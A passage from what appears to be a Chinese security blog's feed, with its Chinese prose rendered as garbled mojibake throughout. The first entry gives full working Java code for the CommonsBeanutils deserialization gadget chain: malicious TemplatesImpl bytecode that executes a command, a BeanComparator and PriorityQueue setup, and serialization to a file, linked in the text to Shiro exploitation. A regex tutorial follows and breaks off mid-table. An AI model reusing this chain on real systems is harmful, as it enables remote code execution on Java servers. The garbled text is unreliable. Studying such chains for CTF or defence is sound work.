</h2><p>é¦–å…ˆæ˜¯æ¶æ„<code>TemplatesImpl</code>çš„æ„å»º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">       </span><br><span class="line">constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">test.setSuperclass(superClass);</span><br><span class="line"><span class="type">byte</span>[] bytes = test.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure><p>æ„é€ <code>beanComparator</code>ï¼Œè®¾ç½®å…¶<code>property</code>å­—æ®µä¸ºå­—ç¬¦ä¸²<code>outputProperties</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BeanComparator&lt;TemplatesImpl&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ„é€ <code>priorityQueue</code>ï¼Œè¿‡ç¨‹å’Œcc2çš„æ„é€ å·®ä¸å¤šï¼Œè¦ä¿è¯æœ‰ä¸¤ä¸ªå…ƒç´ ç¡®ä¿ååºåˆ—åŒ–æ—¶<code>compare()</code>èƒ½å¤Ÿæ‰§è¡Œï¼Œå»¶è¿Ÿæ³¨å…¥<code>comparator</code>é¿å…æå‰æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">Class&lt;?&gt; clazz = priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(priorityQueue, beanComparator);</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br></pre></td></tr></table></figure><p>å…¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">test</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> test.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        test.setSuperclass(superClass);</span><br><span class="line">        <span class="type">byte</span>[] bytes = test.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templatesImpl, <span class="string">&quot;any&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span>  templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templatesImpl, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        BeanComparator&lt;Object&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        beanComparator.setProperty(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, beanComparator);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl, templatesImpl&#125;);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cb.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cb.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥ä¾èµ–æ›¾è¢«shiroæ¡†æ¶ä½¿ç”¨ï¼Œä¹Ÿæ˜¯shiroååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤çš„é‡è¦ç»„æˆ</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼</title>
      <link href="/2026/01/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2026/01/21/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h1><p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ç§ç”¨äºåŒ¹é…å’Œæ“ä½œæ–‡æœ¬çš„å¼ºå¤§å·¥å…·ï¼Œå®ƒæ˜¯ç”±ä¸€ç³»åˆ—å­—ç¬¦å’Œç‰¹æ®Šå­—ç¬¦ç»„æˆçš„æ¨¡å¼ï¼Œç”¨äºæè¿°è¦åŒ¹é…çš„æ–‡æœ¬æ¨¡å¼</p><br/><h2 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h2><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå…¸å‹çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼ç”¨äºåŒ¹é…ä¸­å›½å¤§é™†èº«ä»½è¯å·ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/^(?&lt;province&gt;1[1-5]|2[1-3]|3[1-7]|4[1-6]|5[1-3]|6[1-5]|7[1-3]|8[1-2]|9[1-2])[0-9]&#123;4&#125;(?&lt;birthday&gt;19[0-9]&#123;2&#125;|20[0-1][0-9])(0[1-9]|1[0-2])(0[1-9]|[12][0-9]|3[01])(?&lt;sequence&gt;[0-9]&#123;3&#125;)(?&lt;check&gt;[0-9Xx])$/</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ä»¥<code>/^</code>å’Œ<code>$/</code>ä½œä¸º<strong>å®šç•Œç¬¦</strong>ï¼Œåˆ†åˆ«è¡¨ç¤ºæ­£åˆ™è¡¨è¾¾å¼çš„å¼€å§‹ä¸ç»“æŸï¼Œå­—ç¬¦ <strong>^</strong> å’Œ <strong>$</strong> åŒæ—¶ä½¿ç”¨æ—¶ï¼Œè¡¨ç¤ºç²¾ç¡®åŒ¹é…</p><p>å½¢å¦‚<code>(?&lt;province&gt;...)</code>æˆ– <code>(?&#39;province&#39;...)</code>çš„ç»“æ„ç§°ä¸º<strong>å‘½åæ•è·ç»„</strong>ï¼Œè¡¨ç¤ºå°†åŒ¹é…çš„å†…å®¹æ•è·è¿›åä¸º<code>province</code>çš„ç»„ä¸­</p><p><code>1[1-5]|2[1-3]|</code>è¿™è¡¨ç¤ºç¬¬ä¸€ä½æ•°å­—ä¸º1æ—¶ï¼Œç¬¬äºŒä½æ•°å­—åªèƒ½ä¸º1~5ä¸­çš„å€¼ï¼Œå¦‚æœç¬¬ä¸€ä½æ•°å­—ä¸º2ï¼Œåˆ™ç¬¬äºŒä½æ•°å­—çš„å–å€¼èŒƒå›´åˆ™ä¸º1~3ï¼Œå› æ­¤å¯è§<code>|</code>ç¬¦å·ç”¨äºè¡¨è¾¾ä¸€ç§<strong>é€»è¾‘æˆ–</strong>å…³ç³»</p><p>åœ¨ç¬¬ä¸€ä¸ªå‘½åæ•è·ç»„ç»“æŸåï¼Œ<code>{4}</code>ä¸º<strong>ç²¾ç¡®æ•°é‡é™å®šç¬¦</strong>ï¼Œè¡¨ç¤ºå‰é¢çš„æ¨¡å¼å¿…é¡»æ°å¥½é‡å¤4æ¬¡ï¼Œç”¨äºåŒ¹é…èº«ä»½è¯ä¸­çš„å¸‚çº§ã€å¿çº§åœ°å€ç ï¼Œè¯¥é™å®šç¬¦åªå¯¹å‰é¢çš„<code>[0-9]</code>æœ‰æ•ˆï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªå‘½åæ•è·ç»„ç»“æŸååº”æ¥4ä¸ªä»»æ„æ•°å­—</p><p>åé¢ç”Ÿæ—¥çš„éƒ¨åˆ†å°±å¾ˆå¥½ç†è§£äº†ï¼Œè¿™é‡ŒåŒ¹é…äº†1900~2019å¹´é—´å‡ºç”Ÿçš„äººï¼Œè¿˜æœ‰é¡ºåºç ï¼ŒåŒ¹é…ä¸‰ä½æ•°å­—</p><p>æœ€åæ˜¯æ ¡éªŒç ï¼Œ<code>[0-9Xx]</code>è¡¨ç¤ºåŒ¹é…ä»»æ„æ•°å­—å’Œå­—æ¯<code>X</code>å’Œ<code>x</code></p><br/><h2 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h2><p>æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„å…ƒå­—ç¬¦æ˜¯å…·æœ‰ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼Œå®ƒä»¬ä¸è¡¨ç¤ºå­—é¢æ„ä¹‰ï¼Œè€Œæ˜¯ç”¨äºæ§åˆ¶åŒ¹é…æ¨¡å¼</p><h3 id="åŸºæœ¬å…ƒå­—ç¬¦"><a href="#åŸºæœ¬å…ƒå­—ç¬¦" class="headerlink" title="åŸºæœ¬å…ƒå­—ç¬¦"></a>åŸºæœ¬å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong><code>.</code></strong></td><td align="left">åŒ¹é…**é™¤æ¢è¡Œç¬¦(\n)**å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦</td><td align="left"><code>a.b</code></td></tr><tr><td align="left"><strong><code>^</code></strong></td><td align="left">åŒ¹é…<strong>å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</strong></td><td align="left"><code>^abc</code></td></tr><tr><td align="left"><strong><code>$</code></strong></td><td align="left">åŒ¹é…<strong>å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®</strong></td><td align="left"><code>xyz$</code></td></tr><tr><td align="left"><strong><code>\</code></strong></td><td align="left">1. ä½¿ç‰¹æ®Šå­—ç¬¦å˜ä¸ºæ™®é€šå­—ç¬¦ 2. ä½¿æ™®é€šå­—ç¬¦è·å¾—ç‰¹æ®Šå«ä¹‰</td><td align="left"><code>\d</code></td></tr></tbody></table><h3 id="å­—ç¬¦ç±»å…ƒå­—ç¬¦"><a href="#å­—ç¬¦ç±»å…ƒå­—ç¬¦" class="headerlink" title="å­—ç¬¦ç±»å…ƒå­—ç¬¦"></a>å­—ç¬¦ç±»å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong><code>[ ]</code></strong></td><td align="left">å®šä¹‰å­—ç¬¦é›†åˆï¼ŒåŒ¹é…å…¶ä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦</td><td align="left"><code>[aeiou]</code></td></tr><tr><td align="left"><strong><code>[^ ]</code></strong></td><td align="left">åŒ¹é…<strong>ä¸åœ¨</strong>æ–¹æ‹¬å·ä¸­çš„ä»»æ„å­—ç¬¦</td><td align="left"><code>[^0-9]</code></td></tr><tr><td align="left"><strong><code>-</code></strong></td><td align="left">åœ¨å­—ç¬¦ç±»ä¸­è¡¨ç¤ºå­—ç¬¦èŒƒå›´</td><td align="left"><code>[a-z]</code>ã€<code>[0-9A-F]</code></td></tr></tbody></table><h3 id="é‡è¯å…ƒå­—ç¬¦"><a href="#é‡è¯å…ƒå­—ç¬¦" class="headerlink" title="é‡è¯å…ƒå­—ç¬¦"></a>é‡è¯å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong><code>\*</code></strong></td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼<strong>é›¶æ¬¡æˆ–å¤šæ¬¡</strong></td><td align="left"><code>ab*c</code></td></tr><tr><td align="left"><strong><code>+</code></strong></td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼<strong>ä¸€æ¬¡æˆ–å¤šæ¬¡</strong></td><td align="left"><code>ab+c</code></td></tr><tr><td align="left"><strong><code>?</code></strong></td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼<strong>é›¶æ¬¡æˆ–ä¸€æ¬¡</strong></td><td align="left"><code>colou?r</code></td></tr><tr><td align="left"><strong><code>{n}</code></strong></td><td align="left"><strong>ç²¾ç¡®åŒ¹é…</strong>å‰é¢çš„å­è¡¨è¾¾å¼<strong>næ¬¡</strong></td><td align="left"><code>a{3}</code></td></tr><tr><td align="left"><strong><code>{n,}</code></strong></td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼<strong>è‡³å°‘næ¬¡</strong></td><td align="left"><code>a{2,}</code></td></tr><tr><td align="left"><strong><code>{n,m}</code></strong></td><td align="left">åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼<strong>nåˆ°mæ¬¡</strong></td><td align="left"><code>a{2,4}</code></td></tr></tbody></table><h3 id="åˆ†ç»„å’Œé€‰æ‹©å…ƒå­—ç¬¦"><a href="#åˆ†ç»„å’Œé€‰æ‹©å…ƒå­—ç¬¦" class="headerlink" title="åˆ†ç»„å’Œé€‰æ‹©å…ƒå­—ç¬¦"></a>åˆ†ç»„å’Œé€‰æ‹©å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong><code>( )</code></strong></td><td align="left">å®šä¹‰å­è¡¨è¾¾å¼æˆ–æ•è·ç»„</td><td align="left"><code>(ab)+</code></td></tr><tr><td align="left"><strong><code>|</code></strong></td><td align="left">è¡¨ç¤ºé€»è¾‘â€æˆ–â€å…³ç³»</td><td align="left"><code>cat|dog</code></td></tr></tbody></table><h3 id="ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦"><a href="#ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦"></a>ç‰¹æ®Šå­—ç¬¦ç±»å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç­‰ä»·å­—ç¬¦ç±»</th></tr></thead><tbody><tr><td align="left"><strong><code>\d</code></strong></td><td align="left">åŒ¹é…ä»»æ„æ•°å­—</td><td align="left"><code>[0-9]</code></td></tr><tr><td align="left"><strong><code>\D</code></strong></td><td align="left">åŒ¹é…ä»»æ„éæ•°å­—</td><td align="left"><code>[^0-9]</code></td></tr><tr><td align="left"><strong><code>\w</code></strong></td><td align="left">åŒ¹é…ä»»æ„å•è¯å­—ç¬¦ï¼ˆå­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼‰</td><td align="left"><code>[a-zA-Z0-9_]</code></td></tr><tr><td align="left"><strong><code>\W</code></strong></td><td align="left">åŒ¹é…ä»»æ„éå•è¯å­—ç¬¦</td><td align="left"><code>[^a-zA-Z0-9_]</code></td></tr><tr><td align="left"><strong><code>\s</code></strong></td><td align="left">åŒ¹é…ä»»æ„ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ç­‰ï¼‰</td><td align="left"><code>[ \t\r\n\f]</code></td></tr><tr><td align="left"><strong><code>\S</code></strong></td><td align="left">åŒ¹é…ä»»æ„éç©ºç™½å­—ç¬¦</td><td align="left"><code>[^ \t\r\n\f]</code></td></tr></tbody></table><h3 id="è¾¹ç•ŒåŒ¹é…å…ƒå­—ç¬¦"><a href="#è¾¹ç•ŒåŒ¹é…å…ƒå­—ç¬¦" class="headerlink" title="è¾¹ç•ŒåŒ¹é…å…ƒå­—ç¬¦"></a>è¾¹ç•ŒåŒ¹é…å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong><code>\b</code></strong></td><td align="left">åŒ¹é…å•è¯è¾¹ç•Œï¼ˆå•è¯ä¸éå•è¯å­—ç¬¦çš„äº¤ç•Œå¤„ï¼‰</td><td align="left"><code>\bcat\b</code></td></tr><tr><td align="left"><strong><code>\B</code></strong></td><td align="left">åŒ¹é…éå•è¯è¾¹ç•Œ</td><td align="left"><code>\Bcat\B</code></td></tr></tbody></table><p><code>\bcat\b</code> åŒ¹é… <code>cat</code> ä½†ä¸åŒ¹é… <code>category</code>ï¼Œ<code>\Bcat\B</code> åŒ¹é… <code>scattered</code>ä¸­çš„ <code>cat</code>ä½†ä¸åŒ¹é…å•ç‹¬çš„ <code>cat</code></p><h3 id="å…¶ä»–å…ƒå­—ç¬¦"><a href="#å…¶ä»–å…ƒå­—ç¬¦" class="headerlink" title="å…¶ä»–å…ƒå­—ç¬¦"></a>å…¶ä»–å…ƒå­—ç¬¦</h3><table><thead><tr><th align="left">å…ƒå­—ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ASCIIå€¼</th><th align="left">å¸¸è§æ¥æº</th></tr></thead><tbody><tr><td align="left"><strong><code>\n</code></strong></td><td align="left">åŒ¹é…æ¢è¡Œç¬¦ï¼ˆæ¢è¡Œï¼‰</td><td align="left">0x0A</td><td align="left">Unix&#x2F;Linux æ¢è¡Œç¬¦</td></tr><tr><td align="left"><strong><code>\t</code></strong></td><td align="left">åŒ¹é…åˆ¶è¡¨ç¬¦</td><td align="left">0x09</td><td align="left">é”®ç›˜ Tab é”®</td></tr><tr><td align="left"><strong><code>\r</code></strong></td><td align="left">åŒ¹é…å›è½¦ç¬¦</td><td align="left">0x0D</td><td align="left">è€å¼ Mac æ¢è¡Œç¬¦ï¼ŒWindows æ¢è¡Œç¬¦çš„ä¸€éƒ¨åˆ†</td></tr><tr><td align="left"><strong><code>\f</code></strong></td><td align="left">åŒ¹é…æ¢é¡µç¬¦</td><td align="left">0x0C</td><td align="left">æ‰“å°æœºæ¢é¡µ</td></tr><tr><td align="left"><strong><code>\v</code></strong></td><td align="left">åŒ¹é…å‚ç›´åˆ¶è¡¨ç¬¦</td><td align="left">0x0B</td><td align="left">å‚ç›´åˆ¶è¡¨</td></tr></tbody></table><br/><h2 id="ä¿®é¥°ç¬¦"><a href="#ä¿®é¥°ç¬¦" class="headerlink" title="ä¿®é¥°ç¬¦"></a>ä¿®é¥°ç¬¦</h2><p>æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦ï¼ˆä¹Ÿç§°ä¸ºæ¨¡å¼ä¿®é¥°ç¬¦æˆ–æ ‡è®°ï¼‰æ˜¯ç”¨äºæ”¹å˜æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…è¡Œä¸ºçš„ç‰¹æ®ŠæŒ‡ä»¤ï¼Œæ ‡è®°ä¸å†™åœ¨æ­£åˆ™è¡¨è¾¾å¼é‡Œï¼Œæ ‡è®°ä½äºè¡¨è¾¾å¼ä¹‹å¤–ï¼Œæ ¼å¼ï¼š<code>/pattern/flags</code></p><table><thead><tr><th align="left">ä¿®é¥°ç¬¦</th><th align="left">åŠŸèƒ½æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><strong><code>i</code></strong></td><td align="left">å¿½ç•¥å¤§å°å†™ï¼Œä½¿åŒ¹é…ä¸åŒºåˆ†å¤§å°å†™</td><td align="left"><code>/abc/i</code></td></tr><tr><td align="left"><strong><code>g</code></strong></td><td align="left">å…¨å±€åŒ¹é…ï¼ŒæŸ¥æ‰¾æ‰€æœ‰åŒ¹é…é¡¹è€Œä¸æ˜¯ç¬¬ä¸€ä¸ªå°±åœæ­¢</td><td align="left"><code>/ab/g</code></td></tr><tr><td align="left"><strong><code>m</code></strong></td><td align="left">å¤šè¡Œæ¨¡å¼ï¼Œä½¿ <code>^</code> å’Œ <code>$</code> åŒ¹é…æ¯è¡Œçš„å¼€å¤´å’Œç»“å°¾</td><td align="left"><code>/^abc/m</code></td></tr><tr><td align="left"><strong><code>s</code></strong></td><td align="left">å•è¡Œæ¨¡å¼ï¼Œä½¿ç‚¹å· <code>.</code> åŒ¹é…åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…çš„æ‰€æœ‰å­—ç¬¦</td><td align="left"><code>/a.b/s</code></td></tr><tr><td align="left"><strong><code>u</code></strong></td><td align="left">Unicodeæ¨¡å¼ï¼Œå¯ç”¨å®Œæ•´çš„Unicodeæ”¯æŒ</td><td align="left"><code>/\p{L}/u</code></td></tr><tr><td align="left"><strong><code>y</code></strong></td><td align="left">ç²˜æ€§åŒ¹é…ï¼Œä»ç›®æ ‡å­—ç¬¦ä¸²çš„å½“å‰ä½ç½®å¼€å§‹åŒ¹é…</td><td align="left"><code>/a/y</code></td></tr><tr><td align="left"><strong><code>x</code></strong></td><td align="left">æ‰©å±•æ¨¡å¼ï¼Œå¿½ç•¥æ¨¡å¼ä¸­çš„ç©ºç™½å’Œæ³¨é‡Š</td><td align="left"><code>/a b c/x</code></td></tr></tbody></table><br/><h2 id="æ–­è¨€"><a href="#æ–­è¨€" class="headerlink" title="æ–­è¨€"></a>æ–­è¨€</h2><p>æ–­è¨€ï¼ˆAssertionï¼‰æ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­ç”¨äºæŒ‡å®šåŒ¹é…ä½ç½®çš„å…ƒå­—ç¬¦ï¼Œå®ƒä»¬ä¸åŒ¹é…ä»»ä½•å®é™…å­—ç¬¦ï¼Œè€Œæ˜¯åŒ¹é…å­—ç¬¦ä¹‹é—´çš„ä½ç½®</p><table><thead><tr><th align="left">æ–­è¨€ç±»å‹</th><th align="left">æ­£åˆ™è¯­æ³•</th><th align="left">åˆ«ç§°</th><th align="left">æ£€æŸ¥æ–¹å‘</th><th align="left">æœŸæœ›æ¡ä»¶</th></tr></thead><tbody><tr><td align="left"><strong>æ­£å‘å…ˆè¡Œæ–­è¨€</strong></td><td align="left"><code>(?=pattern)</code></td><td align="left">æ­£å‰ç»</td><td align="left">å‘å³ï¼ˆå‘å‰ï¼‰</td><td align="left">å­˜åœ¨ pattern</td></tr><tr><td align="left"><strong>è´Ÿå‘å…ˆè¡Œæ–­è¨€</strong></td><td align="left"><code>(?!pattern)</code></td><td align="left">è´Ÿå‰ç»</td><td align="left">å‘å³ï¼ˆå‘å‰ï¼‰</td><td align="left">ä¸å­˜åœ¨ pattern</td></tr><tr><td align="left"><strong>æ­£å‘åè¡Œæ–­è¨€</strong></td><td 